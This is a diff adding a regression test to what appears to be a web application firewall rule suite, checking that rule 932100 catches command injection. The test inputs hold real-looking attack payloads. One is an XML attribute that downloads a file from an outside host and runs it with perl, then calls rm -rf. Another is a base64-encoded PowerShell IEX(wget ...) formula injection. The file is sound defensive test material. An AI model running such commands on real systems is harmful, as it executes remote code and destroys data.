@@ -59,3 +59,19 @@ tests:
             encoded_request: "UE9TVCAvaW5kZXguaHRtbCBIVFRQLzEuMQpIb3N0OiAxOTIuMTY4LjEuMjMKVXNlci1BZ2VudDogY3VybC83LjQzLjAKQWNjZXB0OiAqLyoKQ29udGVudC1MZW5ndGg6IDY0CkNvbnRlbnQtVHlwZTogYXBwbGljYXRpb24veC13d3ctZm9ybS11cmxlbmNvZGVkCkNvbm5lY3Rpb246IGNsb3NlCgpkPTE7MjszOzQ7NVxuMTtAU1VNKDErMSkqY21kfCcgcG93ZXJzaGVsbCBJRVgod2dldCAwci5wZS9wKSdcIUEwOzM="
           output:
             status: [403, 400]
+  - test_title: 932100-4
+    desc: 'GHSA: 932100 payload via XML attribute injection (verifies XML://@* coverage)'
+    stages:
+      - stage:
+          input:
+            dest_addr: 127.0.0.1
+            method: POST
+            port: 80
+            headers:
+              User-Agent: ModSecurity CRS 3 Tests
+              Host: localhost
+              Content-Type: 'application/xml'
+            uri: '/'
+            data: '<?xml version="1.0"?><root><a probe="system(''echo cd /tmp;wget http://turbatu.altervista.org/apache_32.png -O p2.txt;curl -O http://turbatu.altervista.org/apache_32.png; mv apache_32.png p.txt;lyxn -DUMP http://turbatu.altervista.org/apache_32.png &gt;p3.txt;perl p.txt; perl p2.txt;perl p3.txt;rm -rf"></a></root>'
+          output:
+            log_contains: id "932100"
